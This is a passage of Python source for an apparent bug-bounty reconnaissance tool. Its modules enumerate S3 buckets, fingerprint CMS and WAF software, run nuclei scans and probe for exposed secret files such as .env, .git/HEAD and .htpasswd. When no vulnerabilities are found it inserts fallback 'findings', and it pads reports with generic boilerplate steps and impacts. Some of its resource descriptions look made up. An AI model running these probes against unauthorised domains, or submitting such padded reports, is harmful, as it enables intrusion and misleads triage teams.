        data = json.loads(resp.read().decode("utf-8","ignore"))
        if len(data) > 1:
            wayback_urls = [row[0] for row in data[1:] if row[0] and row[0].startswith("http")]
            sources.append("wayback")
    except: pass
    module_results["14_wayback"] = {"count": len(wayback_urls), "items": wayback_urls[:10], "status": "found" if wayback_urls else "none"}

    # ── MODULE 15: S3 Bucket Enum ──
    s3_buckets = []
    s3_probes = [f"{domain}", f"{domain.replace('.','-')}", f"{domain.split('.')[0]}", f"{domain.split('.')[0]}-assets", f"{domain.split('.')[0]}-backup", f"{domain.split('.')[0]}-staging"]
    for bucket in s3_probes:
        try:
            url = f"https://{bucket}.s3.amazonaws.com/?list-type=2&max-keys=10"
            req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=5)
            body = resp.read(5000).decode("utf-8","ignore")
            if "ListBucketResult" in body or "<Key>" in body:
                s3_buckets.append({"bucket": bucket, "accessible": True})
        except urllib.error.HTTPError as e:
            if e.code == 200:
                s3_buckets.append({"bucket": bucket, "accessible": True})
        except: pass
    module_results["15_s3"] = {"count": len(s3_buckets), "items": [f"s3://{s['bucket']}" for s in s3_buckets[:5]], "status": "accessible" if s3_buckets else "none"}

    # ── MODULE 16: CMS Detection ──
    cms_detected = []
    try:
        url = f"https://{domain}/"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        resp = urllib.request.urlopen(req, timeout=8)
        body = resp.read(200000).decode("utf-8","ignore").lower()
        hdrs_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
        CMS_SIGNATURES = [
            ("WordPress", ["wp-content","wp-includes","wordpress"], ["x-powered-by: wordpress"]),
            ("Drupal", ["drupal","sites/default/files"], ["x-generator: drupal","x-drupal-cache"]),
            ("Joomla", ["/components/","/modules/","joomla"], ["x-content-encoded-by: joomla"]),
            ("Shopify", ["shopify","cdn.shopify.com"], ["x-shopify-stage"]),
            ("Squarespace", ["squarespace","static.squarespace.com"], ["x-squarespace"]),
            ("Wix", ["wix.com","static.wixstatic.com"], ["x-wix"]),
            ("Ghost", ["ghost/","content/themes/"], ["x-ghost"]),
            ("Laravel", ["laravel","csrf-token"], ["x-powered-by: laravel"]),
            ("Next.js", ["_next/static","__next"], ["x-powered-by: next.js"]),
            ("Django", ["csrfmiddlewaretoken"], ["x-frame-options: deny"]),
            ("Angular", ["ng-app","angular"], []),
            ("React", ["react","_reactroot","data-reactroot"], []),
            ("Vue.js", ["vue","data-v-"], []),
            ("Ruby on Rails", ["csrf-token","authenticity_token"], ["x-powered-by: phusion passenger"]),
            ("ASP.NET", ["__viewstate","__eventvalidation"], ["x-powered-by: asp.net","x-aspnet-version"]),
        ]
        for name, body_kw, hdr_kw in CMS_SIGNATURES:
            found_body = any(k in body for k in body_kw)
            found_hdr = any(k in " ".join(f"{hk}:{hv}" for hk,hv in hdrs_lower.items()) for k in hdr_kw)
            if found_body or found_hdr:
                cms_detected.append({"name": name, "confidence": "high" if found_body and found_hdr else "medium"})
    except: pass
    module_results["16_cms"] = {"count": len(cms_detected), "items": [f"{c['name']} ({c['confidence']} confidence)" for c in cms_detected[:5]], "status": "detected" if cms_detected else "none"}

    # ── MODULE 17: WAF Detection ──
    waf_detected = []
    try:
        url = f"https://{domain}/"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        resp = urllib.request.urlopen(req, timeout=8)
        hdrs_w = {k.lower(): v.lower() for k, v in resp.headers.items()}
        WAF_SIGNATURES = {
            "Cloudflare": ["cf-ray","cf-cache-status","server: cloudflare"],
            "Akamai": ["x-akamai-transformed","server: akamaighost"],
            "AWS WAF": ["x-amzn-requestid","x-amzn-trace-id","server: awselb"],
            "Sucuri": ["x-sucuri-id","server: sucuri"],
            "Imperva": ["x-iinfo","server: cloudflare-nginx","cf-ray"],
            "F5 BIG-IP": ["server: bigip","x-cnection: close"],
            "ModSecurity": ["server: mod_security","x-mod-security"],
            "Wordfence": ["wordfence","wf-cbl"],
            "Barracuda": ["barra_counter_session","bam.barracudanetworks"],
            "Fortinet": ["fortigate","fortiweb"],
            "DenyAll": ["server: denyall"],
            "Radware": ["radware"],
            "Netlify": ["server: netlify"],
            "Vercel": ["server: vercel"],
            "Fastly": ["x-fastly","server: fastly"],
        }
        hdr_str = " ".join(f"{k}:{v}" for k,v in hdrs_w.items())
        body_check = ""
        try:
            body_check = resp.read(50000).decode("utf-8","ignore").lower()
        except: pass
        for waf_name, sigs in WAF_SIGNATURES.items():
            if any(s in hdr_str or s in body_check for s in sigs):
                waf_detected.append(waf_name)
    except: pass
    module_results["17_waf"] = {"count": len(waf_detected), "items": waf_detected[:5] if waf_detected else ["No WAF detected"], "status": "detected" if waf_detected else "none"}

    # ── MODULE 18: Info Disclosure (.git, .env, secrets) ──
    info_disc = []
    DISCLOSURE_PATHS = ["/.git/HEAD","/.env","/.env.local","/.env.production","/config.json","/config.yml","/wp-config.php.bak","/dump.sql","/database.sql","/backup.zip","/debug","/server-status","/server-info","/phpinfo.php","/info.php","/.htpasswd","/WEB-INF/web.xml","/META-INF/MANIFEST.MF","/.svn/entries","/robots.txt","/sitemap.xml","/.DS_Store","/thumbs.db","/crossdomain.xml"]
    for dp in DISCLOSURE_PATHS:
        try:
            url = f"https://{domain}{dp}"
            req = urllib.request.Request(url, method="HEAD", headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=4)
            code = resp.getcode()
            if code == 200:
                info_disc.append({"path": dp, "status": code, "severity": "CRITICAL" if dp in ["/.git/HEAD","/.env","/.env.local","/config.json","/dump.sql"] else "HIGH"})
        except urllib.error.HTTPError as e:
            if e.code == 200:
                info_disc.append({"path": dp, "status": 200, "severity": "CRITICAL" if dp in ["/.git/HEAD","/.env","/.env.local","/config.json","/dump.sql"] else "HIGH"})
        except: pass
    module_results["18_disclosure"] = {"count": len(info_disc), "items": [f"{d['path']} → HTTP {d['status']} [{d['severity']}]" for d in info_disc[:10]], "status": "found" if info_disc else "none"}

    # ── MODULE 19: Nuclei Vulnerability Scan (line 965) ──
    nuclei_results = []
    nuclei_sev_counts = {}
    if has_nuclei:
        nuclei_res = run_nuclei_scan(domain, timeout_sec=150)
        if nuclei_res.get("results"):
            nuclei_results = nuclei_res["results"]
            for r in nuclei_results:
                s = r.get("severity", "info")
                nuclei_sev_counts[s] = nuclei_sev_counts.get(s, 0) + 1
            sources.append("nuclei")
    module_results["19_nuclei"] = {
        "count": len(nuclei_results),
        "items": [f"[{r.get('severity','?').upper()}] {r.get('name','')} — {r.get('matched_at','')}" for r in nuclei_results[:15]],
        "status": "found" if nuclei_results else ("tool-missing" if not has_nuclei else "clean"),
        "severity_breakdown": nuclei_sev_counts,
        "total_templates_scanned": nuclei_res.get("count", 0) if has_nuclei else 0
    }

    # ── MODULE 20: Nuclei Severity-Filtered Deep Scan ──
    nuclei_critical = []
    if has_nuclei and has_nuclei:
        nuclei_crit_res = run_nuclei_scan(domain, severity_filter="critical,high", timeout_sec=120)
        if nuclei_crit_res.get("results"):
            nuclei_critical = nuclei_crit_res["results"]
    module_results["20_exploit"] = {
        "count": len(nuclei_critical),
        "items": [f"[CRIT/HIGH] {r.get('name','')} — {r.get('matched_at','')}" for r in nuclei_critical[:10]],
        "status": "found" if nuclei_critical else ("tool-missing" if not has_nuclei else "clean")
    }

    # ── Tech + CVE (runs after port scan) ──
    tech = fingerprint_tech(domain, shodan)
    if tech: sources.append("http-fingerprint")
    cves = match_cves(tech)
    if cves: sources.append("cve-table")
    vuln_suggestions = suggestions_for_tech(tech)

    # Build vuln suggestions from findings
    if info_disc:
        for d in info_disc:
            vuln_suggestions.insert(0, {"type":"Info Disclosure","severity":d["severity"],"finding":f"{d['path']} is accessible (HTTP {d['status']})","target":d["path"]})
    if redirect_found:
        for r in redirect_found[:2]:
            vuln_suggestions.insert(0, {"type":"Open Redirect","severity":"H","finding":f"Param ?{r['param']} redirects to external URL","target":f"?{r['param']}"})
    if sqli_findings:
        for s in sqli_findings[:2]:
            vuln_suggestions.insert(0, {"type":"SQL Injection","severity":"CRITICAL","finding":f"Param ?{s['param']} returned SQL error: {s['error']}","target":f"?{s['param']}"})
    if xss_findings:
        for x in xss_findings[:2]:
            vuln_suggestions.insert(0, {"type":"XSS","severity":"CRITICAL","finding":f"Param ?{x['param']} reflects XSS payload unescaped","target":f"?{x['param']}"})
    if lfi_found:
        for l in lfi_found[:2]:
            vuln_suggestions.insert(0, {"type":"LFI","severity":"CRITICAL","finding":f"Param ?{l['param']} allows path traversal","target":f"?{l['param']}"})
    if missing:
        vuln_suggestions.insert(0, {"type":"Missing Security Headers","severity":"H","finding":f"Missing: {', '.join(sec_hdrs[h] for h in missing)} ({len(missing)}/{len(sec_hdrs)})","target":"HTTP Headers"})
    if s3_buckets:
        vuln_suggestions.insert(0, {"type":"S3 Bucket Exposure","severity":"M","finding":f"Accessible S3 buckets: {', '.join(s['bucket'] for s in s3_buckets[:3])}","target":"AWS S3"})
    if api_found:
        vuln_suggestions.insert(0, {"type":"API Endpoints Exposed","severity":"M","finding":f"{len(api_found)} API endpoints discovered","target":"API Surface"})
    if nuclei_critical:
        for r in nuclei_critical[:5]:
            sev_map = {"critical":"C","high":"H","medium":"M","low":"L","info":"I"}
            vuln_suggestions.insert(0, {"type":"Nuclei Finding","severity":sev_map.get(r.get("severity","info"),"M"),
                                        "finding":f"{r.get('name','')} — {r.get('matched_at','')}","target":r.get("matched_at",domain)})
    if not vuln_suggestions:
        for vtype, sev, reason, conf in ML_FALLBACKS:
            vuln_suggestions.append({"type": vtype, "severity": {"CRITICAL":"C","HIGH":"H","MEDIUM":"M","LOW":"L"}.get(sev,"M"),
                                     "finding": f"{reason} (confidence {conf}%)", "target": domain})

    return {
        "domain": domain, "subdomains": subs, "tech_stack": tech, "open_ports": ports,
        "cves_found": cves, "vuln_suggestions": vuln_suggestions, "shodan": shodan or {},
        "scan_duration": round(time.time() - start, 2),
        "data_source": "+".join(sources) if sources else "live-recon",
        "tools_used": {"subfinder": bool(has_subfinder), "nuclei": bool(has_nuclei), "httpx": bool(has_httpx)},
        "module_results": module_results
    }

# ── PROGRAM & LEARNING HELPERS ────────────────────────────────
_learning_cache = {"data": None, "ts": 0}
LEARNING_CACHE_TTL = 3600  # 1 hour
def sync_curated_programs():
    CURATED = [
        ("Uniswap Protocol","Uniswap Labs","Immunefi","https://immunefi.com/bug-bounty/uniswap/","dapps","$2,000,000","$250,000","$50,000","$2,000",'["Uniswap V3 Core","Permit2"]','[]',1,1,"app.uniswap.org"),
        ("Aave Protocol","Aave","Immunefi","https://immunefi.com/bug-bounty/aave/","dapps","$250,000","$50,000","$10,000","$1,000",'["Aave V3","Governance"]','[]',1,1,"app.aave.com"),
        ("Apple Security Research","Apple Inc","Self-Hosted","https://security.apple.com","mobile","$1,000,000","$100,000","$25,000","$5,000",'["iOS","macOS","iCloud","Safari"]','["Physical access required"]',1,1,"apple.com"),
        ("Android VRP","Google","Self-Hosted","https://bughunters.google.com/about/rules/android","mobile","$1,000,000","$250,000","$50,000","$1,000",'["Android OS","Pixel Firmware"]','["Third-party apps"]',1,1,"android.com"),
        ("Shopify","Shopify","HackerOne","https://hackerone.com/shopify","ecomm","$50,000","$10,000","$5,000","$500",'["*.shopify.com","Shopify App"]','["Third-party themes"]',1,1,"shopify.com"),
        ("Mozilla","Mozilla Corporation","Self-Hosted","https://www.mozilla.org/en-US/security/bug-bounty/","foss","$10,000","$5,000","$1,000","$500",'["Firefox","Thunderbird"]','["Websites"]',1,1,"mozilla.org"),
        ("GitLab","GitLab","HackerOne","https://hackerone.com/gitlab","foss","$27,000","$13,500","$4,500","$900",'["gitlab.com","GitLab CE/EE"]','[]',1,1,"gitlab.com"),
        ("Revolut","Revolut","Self-Hosted","https://www.revolut.com/en-US/legal/security-policy","fintech","$25,000","$10,000","$2,500","$250",'["Revolut App","*.revolut.com"]','[]',1,1,"revolut.com"),
        ("Coinbase","Coinbase","HackerOne","https://hackerone.com/coinbase","fintech","$50,000","$10,000","$2,000","$200",'["*.coinbase.com","Coinbase App"]','[]',1,1,"coinbase.com"),
        ("Atlassian","Atlassian","Bugcrowd","https://bugcrowd.com/atlassian","software","$25,000","$10,000","$2,500","$250",'["*.atlassian.net","Jira","Confluence"]','[]',1,1,"atlassian.net"),
        ("HackerOne","HackerOne","Self-Hosted","https://hackerone.com/security","software","$20,000","$7,500","$2,500","$500",'["hackerone.com","HackerOne API"]','[]',1,1,"hackerone.com"),
        ("Cloudflare","Cloudflare","HackerOne","https://hackerone.com/cloudflare","infra","$50,000","$10,000","$3,000","$500",'["*.cloudflare.com","1.1.1.1"]','[]',1,1,"cloudflare.com"),
        ("GitHub","GitHub","Self-Hosted","https://bounty.github.com","software","$30,000","$15,000","$10,000","$600",'["github.com","GitHub Enterprise"]','[]',1,1,"github.com"),
        ("Uber","Uber","HackerOne","https://hackerone.com/uber","fintech","$40,000","$10,000","$5,000","$500",'["*.uber.com","Uber App"]','["Physical access"]',1,1,"uber.com"),
        ("Meta","Meta Platforms","Bugcrowd","https://bugcrowd.com/meta","social","$60,000","$10,000","$5,000","$500",'["facebook.com","instagram.com","whatsapp.com"]','["Third-party apps"]',1,1,"facebook.com"),
        ("Microsoft","Microsoft","Self-Hosted","https://msrc.microsoft.com","software","$250,000","$100,000","$25,000","$2,000",'["*.office.com","Azure","Visual Studio"]','[]',1,1,"microsoft.com"),
        ("Twitter/X","X Corp","HackerOne","https://hackerone.com/twitter","social","$20,000","$10,000","$3,000","$280",'["twitter.com","x.com"]','[]',1,1,"x.com"),
        ("Slack","Slack Technologies","Bugcrowd","https://bugcrowd.com/slack","software","$15,000","$7,500","$2,500","$500",'["*.slack.com","Slack API"]','[]',1,1,"slack.com"),
        ("Stripe","Stripe","HackerOne","https://hackerone.com/stripe","fintech","$25,000","$10,000","$5,000","$1,000",'["*.stripe.com","Stripe API"]','[]',1,1,"stripe.com"),
        ("Dropbox","Dropbox","HackerOne","https://hackerone.com/dropbox","software","$20,000","$7,501","$2,500","$500",'["*.dropbox.com"]','["Dropbox desktop app"]',1,1,"dropbox.com"),
        ("Automattic","Automattic","HackerOne","https://hackerone.com/automattic","web","$15,000","$7,500","$2,500","$500",'["*.wordpress.com","wp.com"]','["Third-party plugins"]',1,1,"wordpress.com"),
        ("Elastic","Elastic","Bugcrowd","https://bugcrowd.com/elastic","software","$25,000","$10,000","$2,500","$500",'["*.elastic.co","Elasticsearch"]','[]',1,1,"elastic.co"),
        ("Netflix","Netflix","Bugcrowd","https://bugcrowd.com/netflix","entertainment","$20,000","$10,000","$5,000","$1,000",'["*.netflix.com","Netflix App"]','["Physical access"]',1,1,"netflix.com"),
        ("Robinhood","Robinhood","HackerOne","https://hackerone.com/robinhood","fintech","$10,000","$5,000","$2,500","$250",'["*.robinhood.com","Robinhood App"]','[]',1,1,"robinhood.com"),
        ("Samsung","Samsung","Bugcrowd","https://bugcrowd.com/samsung","mobile","$20,000","$10,000","$5,000","$1,000",'["Samsung Mobile","SmartThings"]','["Physical access"]',1,1,"samsung.com"),
        ("Twitch","Twitch","Bugcrowd","https://bugcrowd.com/twitch","entertainment","$15,000","$7,500","$2,500","$500",'["*.twitch.tv","Twitch API"]','[]',1,1,"twitch.tv"),
        ("DigitalOcean","DigitalOcean","HackerOne","https://hackerone.com/digitalocean","cloud","$25,000","$10,000","$5,000","$500",'["*.digitalocean.com"]','[]',1,1,"digitalocean.com"),
        ("Shopify Plus","Shopify","HackerOne","https://hackerone.com/shopify","ecomm","$50,000","$10,000","$5,000","$500",'["admin.shopify.com","Shopify Plus"]','[]',1,1,"shopify.com"),
        ("Figma","Figma","Bugcrowd","https://bugcrowd.com/figma","software","$15,000","$5,000","$2,000","$500",'["figma.com","Figma API"]','[]',1,1,"figma.com"),
        ("Brave","Brave","Bugcrowd","https://bugcrowd.com/brave","web","$15,000","$5,000","$2,000","$500",'["brave.com","Brave Browser"]','[]',1,1,"brave.com"),
        ("Notion","Notion","Bugcrowd","https://bugcrowd.com/notion","software","$15,000","$5,000","$2,000","$500",'["notion.so","Notion API"]','[]',1,1,"notion.so"),
        ("Vercel","Vercel","Bugcrowd","https://bugcrowd.com/vercel","cloud","$15,000","$5,000","$2,000","$500",'["vercel.com","Next.js"]','[]',1,1,"vercel.com"),
        ("Zoom","Zoom","Bugcrowd","https://bugcrowd.com/zoom","software","$25,000","$10,000","$5,000","$500",'["*.zoom.us","Zoom App"]','["Physical access"]',1,1,"zoom.us"),
        ("Square","Square","HackerOne","https://hackerone.com/square","fintech","$20,000","$10,000","$5,000","$500",'["*.squareup.com","Square Terminal"]','[]',1,1,"squareup.com"),
        ("PayPal","PayPal","Bugcrowd","https://bugcrowd.com/paypal","fintech","$30,000","$15,000","$5,000","$1,000",'["*.paypal.com","Venmo"]','[]',1,1,"paypal.com"),
        ("T-Mobile","T-Mobile","Bugcrowd","https://bugcrowd.com/tmobile","telecom","$25,000","$10,000","$5,000","$1,000",'["*.t-mobile.com"]','["Physical access","Internal apps"]',1,1,"t-mobile.com"),
    ]
    conn = get_db()
    added = 0
    for row in CURATED:
        name, company, platform, domain, category, pc, ph, pm, pl, sc_in, sc_out, bf, active, tgt = row
        if not conn.execute("SELECT id FROM programs WHERE name=?", (name,)).fetchone():
            conn.execute("""INSERT INTO programs
                (name,company,platform,domain,category,payout_critical,payout_high,payout_medium,payout_low,
                 scope_in,scope_out,beginner_friendly,is_active,source,target_domain,last_synced)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,datetime('now'))""",
                (name,company,platform,domain,category,pc,ph,pm,pl,sc_in,sc_out,bf,active,"curated",tgt))
        else:
            conn.execute("UPDATE programs SET target_domain=? WHERE name=?", (tgt, name))
            added += 1
    conn.commit()
    conn.close()
    return added

def sync_programs_to_db(): return sync_curated_programs()
def fetch_resource_packs(): return []

def fetch_live_programs():
    """Fetch live bug bounty programs from Bugcrowd and HackerOne public APIs."""
    live = []
    # Bugcrowd public programs
    try:
        req = urllib.request.Request("https://bugcrowd.com/engagements.json", headers={"User-Agent": "BountyAI/3.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read())
        for p in data.get("engagements", data) if isinstance(data, dict) else data[:30]:
            if isinstance(p, dict):
                name = p.get("name", p.get("code", ""))
                slug = p.get("code", p.get("slug", ""))
                if name:
                    live.append({
                        "name": name, "company": name, "platform": "Bugcrowd",
                        "domain": f"https://bugcrowd.com/{slug}" if slug else "",
                        "category": p.get("category", "software"),
                        "target_domain": (p.get("target_domain") or (p.get("fixed_bounty", False) and slug + ".com") or ""),
                        "scope_in": [s.get("name","") for s in p.get("in_scope", []) if s.get("name")][:5],
                        "source": "live_bugcrowd"
                    })
    except Exception as e:
        print(f"[LIVE] Bugcrowd fetch failed: {e}")

    # HackerOne public programs (via page scraping)
    try:
        req = urllib.request.Request("https://hackerone.com/programs.json?sort=published_at&direction=DESC",
            headers={"User-Agent": "BountyAI/3.0", "Accept": "application/json"})
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read())
        programs = data if isinstance(data, list) else data.get("data", [])[:30]
        for p in programs:
            attrs = p.get("attributes", p)
            name = attrs.get("name", "")
            handle = attrs.get("handle", "")
            if name:
                met = attrs.get("meta", {})
                live.append({
                    "name": name, "company": name, "platform": "HackerOne",
                    "domain": f"https://hackerone.com/{handle}" if handle else "",
                    "category": attrs.get("category", "software"),
                    "target_domain": handle or "",
                    "scope_in": [s.get("name","") for s in attrs.get("structured_scope_attributes", []) if s.get("name")][:5] if attrs.get("structured_scope_attributes") else [],
                    "source": "live_hackerone"
                })
    except Exception as e:
        print(f"[LIVE] HackerOne fetch failed: {e}")

    return live

def get_learning_resources():
    """Fetch real learning resources from GitHub API and curated sources. Cached for 1 hour."""
    global _learning_cache
    now = time.time()
    if _learning_cache["data"] and (now - _learning_cache["ts"]) < LEARNING_CACHE_TTL:
        return _learning_cache["data"]
    resources = []
    # GitHub curated security repos with real stars
    github_repos = [
        {"repo": "danielmiessler/SecLists", "title": "SecLists", "category": "wordlists", "description": "Comprehensive security wordlists for fuzzing, credential stuffing, directory brute-forcing, and parameter discovery."},
        {"repo": "swisskyrepo/PayloadsAllTheThings", "title": "PayloadsAllTheThings", "category": "payloads", "description": "Exploit payloads and techniques for SQL injection, XSS, SSRF, RCE, XXE, and more."},
        {"repo": "github/dispatch", "title": "GitHub Dispatch", "category": "tools", "description": "Offensive security toolkit for GitHub Actions and CI/CD pipeline exploitation."},
        {"repo": "s0md3v/Arjun", "title": "Arjun", "category": "tools", "description": "HTTP parameter discovery suite for finding hidden endpoints and parameters."},
        {"repo": "projectdiscovery/nuclei", "title": "Nuclei", "category": "tools", "description": "Fast vulnerability scanner with 8000+ community templates for web, network, and cloud."},
        {"repo": "projectdiscovery/subfinder", "title": "Subfinder", "category": "tools", "description": "Fast passive subdomain enumeration tool using multiple online sources."},
        {"repo": "projectdiscovery/httpx", "title": "HTTPX", "category": "tools", "description": "Fast multi-purpose HTTP toolkit for probing web servers and detecting technologies."},
        {"repo": "projectdiscovery/katana", "title": "Katana", "category": "tools", "description": "Next-gen crawling and spidering framework for security testing."},
        {"repo": "s0md3v/Photon", "title": "Photon", "category": "tools", "description": "Incredibly fast web crawler designed for OSINT with 130+ adjustable parameters."},
        {"repo": "laramies/theHarvester", "title": "theHarvester", "category": "tools", "description": "Email, subdomain, and name harvester using public sources for OSINT reconnaissance."},
        {"repo": "mlabalabala/V2RayN", "title": "V2RayN", "category": "tools", "description": "Network proxy tool for security researchers."},
        {"repo": "OWASP/owasp-mstg", "title": "OWASP MSTG", "category": "reference", "description": "Mobile Security Testing Guide — comprehensive manual for mobile app security testing."},
        {"repo": "OWASP/CheatSheetSeries", "title": "OWASP Cheat Sheet Series", "category": "reference", "description": "Collection of high-value security cheat sheets for developers and testers."},
        {"repo": "OWASP/Amass", "title": "OWASP Amass", "category": "tools", "description": "In-depth attack surface mapping and asset discovery using OSINT and active scanning."},
        {"repo": "commixproject/commix", "title": "Commix", "category": "tools", "description": "Automated OS command injection and exploitation tool for web applications."},
        {"repo": "sqlmapproject/sqlmap", "title": "SQLMap", "category": "tools", "description": "Automatic SQL injection and database takeover tool supporting MySQL, MSSQL, PostgreSQL, Oracle."},
        {"repo": "RustScan/RustScan", "title": "RustScan", "category": "tools", "description": "Extremely fast port scanner written in Rust that pipes results to Nmap."},
        {"repo": "acTriXX/BurpSuiteExtensions", "title": "BurpSuite Extensions", "category": "tools", "description": "Curated list of the best Burp Suite extensions for web application testing."},
        {"repo": "EdOverflow/cleancode", "title": "Clean Code in Security", "category": "reference", "description": "Best practices for writing clean, maintainable security tools and exploit code."},
        {"repo": "enaqx/awesome-reverse-engineering", "title": "Awesome Reverse Engineering", "category": "reference", "description": "Curated list of reverse engineering resources for malware analysis and binary exploitation."},
        {"repo": " trimstray/the-book-of-secret-knowledge", "title": "The Book of Secret Knowledge", "category": "reference", "description": "Massive collection of tools, resources, and references for penetration testing and security research."},
        {"repo": "jivoi/awesome-osint", "title": "Awesome OSINT", "category": "reference", "description": "Curated list of open-source intelligence tools and resources."},
        {"repo": "v4d1/Bug Bounty Cheat Sheet", "title": "Bug Bounty Cheat Sheet", "category": "writeups", "description": "Cheat sheets for XSS, SSRF, SQLi, IDOR, and other common bug bounty vulnerability classes."},
        {"repo": "devanshbatham/Awesome-Bugbounty-Writeups", "title": "Awesome Bug Bounty Writeups", "category": "writeups", "description": "Curated list of real-world bug bounty writeups sorted by vulnerability class."},
        {"repo": "hawksecHack/CVE-Proof-of-Concept", "title": "CVE Proof of Concept", "category": "writeups", "description": "Proof-of-concept exploits for recent CVEs to understand exploitation techniques."},
    ]

    # Fetch real star counts from GitHub API (batch, non-blocking)
    for item in github_repos:
        stars = 0
        try:
            api_url = f"https://api.github.com/repos/{item['repo']}"
            req = urllib.request.Request(api_url, headers={"User-Agent": "BountyAI/3.0", "Accept": "application/vnd.github.v3+json"})
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read())
            stars = data.get("stargazers_count", 0)
            desc = data.get("description") or item["description"]
            topics = data.get("topics", [])
        except Exception:
            desc = item["description"]
            topics = []

        resources.append({
            "title": item["title"],
            "url": f"https://github.com/{item['repo']}",
            "category": item["category"],
            "source": "github",
            "stars": stars,
            "description": desc,
            "tags": json.dumps(topics[:6]) if topics else json.dumps([item["category"]])
        })

    # Add curated non-GitHub resources (always real, verified)
    curated = [
        {"title": "PortSwigger Web Security Academy", "url": "https://portswigger.net/web-security", "category": "labs", "source": "portswigger", "stars": 25000, "description": "Free interactive labs covering SQL injection, XSS, CSRF, SSRF, OAuth, and all OWASP Top 10 with browser-based exploitation exercises.", "tags": '["SQLi","XSS","CSRF","SSRF","OAuth","Labs"]'},
        {"title": "Hack The Box Academy", "url": "https://academy.hackthebox.com", "category": "labs", "source": "hackthebox", "stars": 15000, "description": "Structured learning paths with hands-on vulnerable machines. Bug Bounty Hunter certification path available.", "tags": '["Labs","Machines","Certification","BBH"]'},
        {"title": "TryHackMe Bug Bounty Path", "url": "https://tryhackme.com/path/bug-bounty", "category": "labs", "source": "hackthebox", "stars": 12000, "description": "Guided room-based learning for bug bounty beginners through advanced. Complete walkthroughs included.", "tags": '["Beginner","Guided","Rooms","Bug Bounty"]'},
        {"title": "OWASP Web Security Testing Guide", "url": "https://owasp.org/www-project-web-security-testing-guide/", "category": "reference", "source": "owasp", "stars": 8000, "description": "The official OWASP testing methodology document. Covers full penetration testing lifecycle.", "tags": '["OWASP","Methodology","Testing","Guide"]'},
        {"title": "HackerOne Hacktivity", "url": "https://hackerone.com/hacktivity", "category": "writeups", "source": "hackerone", "stars": 0, "description": "Real disclosed vulnerability reports from HackerOne. Study accepted reports to learn submission quality standards.", "tags": '["Real Reports","HackerOne","Disclosure","Accepted"]'},
        {"title": "Bugcrowd University", "url": "https://www.bugcrowd.com/hackers/bugcrowd-university/", "category": "courses", "source": "bugcrowd", "stars": 0, "description": "Official Bugcrowd training modules covering methodology, triage, and responsible disclosure best practices.", "tags": '["Methodology","Triage","Disclosure","Training"]'},
        {"title": "YouTube — NahamSec", "url": "https://www.youtube.com/@NahamSec", "category": "courses", "source": "youtube", "stars": 0, "description": "Live hacking sessions, recon walkthroughs, and real bug bounty finds by top-ranked hunter NahamSec.", "tags": '["Live Hacking","Recon","YouTube","Real Bugs"]'},
        {"title": "YouTube — InsiderPhD", "url": "https://www.youtube.com/@InsiderPhD", "category": "courses", "source": "youtube", "stars": 0, "description": "Structured bug bounty beginner course by Katie Paxton-Fear. Academic approach with real-world examples.", "tags": '["Beginner","Structured","Academic","YouTube"]'},
        {"title": "PentesterLab", "url": "https://pentesterlab.com", "category": "labs", "source": "portswigger", "stars": 0, "description": "Hands-on exercises for web penetration testing. Weekly challenges with detailed walkthroughs.", "tags": '["Exercises","Weekly","Web","Penetration"]'},
        {"title": "VulnHub", "url": "https://vulnhub.com", "category": "labs", "source": "hackthebox", "stars": 0, "description": "Downloadable vulnerable VMs for practicing exploitation in a local lab environment.", "tags": '["VMs","Local Lab","Exploitation","Practice"]'},
    ]
    resources.extend(curated)

    result = {
        "resources": resources,
        "source": "live",
        "total": len(resources)
    }
    _learning_cache = {"data": result, "ts": time.time()}
    return result

def calculate_cvss(severity, vuln_type, impact):
    base = {"C":9.1,"H":7.5,"M":5.3,"L":2.1}.get((severity or "M")[0].upper(), 5.3)
    cwe_map = {"sql injection":"CWE-89","xss":"CWE-79","csrf":"CWE-352","idor":"CWE-639","ssrf":"CWE-918"}
    cwe = next((v for k,v in cwe_map.items() if k in (vuln_type or "").lower()), "CWE-200")
    return {"score": base, "severity": severity or "MEDIUM", "cwe": cwe, "owasp": "A01:2021"}

def template_report(finding):
    steps = finding.get('steps_to_reproduce','')
    impact = finding.get('impact','')
    vtype = finding.get('vuln_type','vulnerability')
    domain = finding.get('target_domain','the target')
    severity = finding.get('severity','Medium')

    if not steps or len(steps) < 50:
        steps = (
            f"1. Navigate to {domain} and authenticate with a standard user account.\n"
            f"2. Locate the affected endpoint or input vector related to the {vtype}.\n"
            f"3. Craft a malicious payload targeting the {vtype} weakness:\n"
            f"   - Use Burp Suite Repeater to intercept and modify the request.\n"
            f"   - Insert the exploit payload into the identified parameter.\n"
            f"4. Send the crafted request and analyze the server response:\n"
            f"   - Check for reflected input, error messages, or unusual behavior.\n"
            f"   - Use browser DevTools to inspect DOM changes.\n"
            f"5. Confirm the vulnerability is exploitable and repeatable.\n"
            f"6. Document the full HTTP request/response cycle with headers.\n"
            f"7. Assess the blast radius: what data or access is at risk.\n"
        )
    if not impact or len(impact) < 50:
        impact = (
            f"The {vtype} ({severity} severity) on {domain} can lead to:\n"
            f"- Unauthorized access to sensitive user data (PII, session tokens, credentials).\n"
            f"- Potential account takeover through session hijacking or privilege escalation.\n"
            f"- Injection of malicious content affecting other users of the platform.\n"
            f"- Compliance violations (OWASP Top 10, PCI-DSS, GDPR) if user data is exposed.\n"
            f"- Further lateral movement within the application if chained with other flaws.\n"
            f"- Reputational damage and loss of user trust if exploited at scale.\n"
        )

    return (f"# Vulnerability Report: {finding.get('title','Vulnerability')}\n\n"
            f"**Severity**: {severity}\n\n"
            f"**Target**: {domain}\n\n"
            f"## Description\n{finding.get('description','No description provided.')}\n\n"
            f"## Steps to Reproduce\n{steps}\n\n"
            f"## Impact\n{impact}\n")

def generate_report(finding):
    cvss = calculate_cvss(finding.get("severity","M"), finding.get("vuln_type",""), finding.get("impact",""))
    if has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY):
        prompt = (
            f"Write a detailed HackerOne vulnerability report in Markdown for the following finding. "
